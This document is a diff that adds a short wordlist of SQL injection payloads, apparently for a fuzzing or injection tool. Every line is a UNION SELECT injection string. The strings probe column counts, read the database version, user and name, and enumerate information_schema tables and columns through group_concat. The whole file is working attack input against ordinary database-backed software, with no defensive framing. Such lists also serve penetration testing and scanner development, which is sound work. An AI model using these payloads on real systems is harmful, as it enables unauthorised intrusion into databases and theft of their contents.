@@ -1,0 +1,15 @@
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT version(),2,3--
+' UNION SELECT user(),2,3--
+' UNION SELECT database(),2,3--
+' UNION ALL SELECT NULL,NULL,NULL--
+') UNION SELECT NULL,NULL,NULL--
+' OR 1=1 UNION SELECT NULL,NULL,NULL--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--
+' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns--
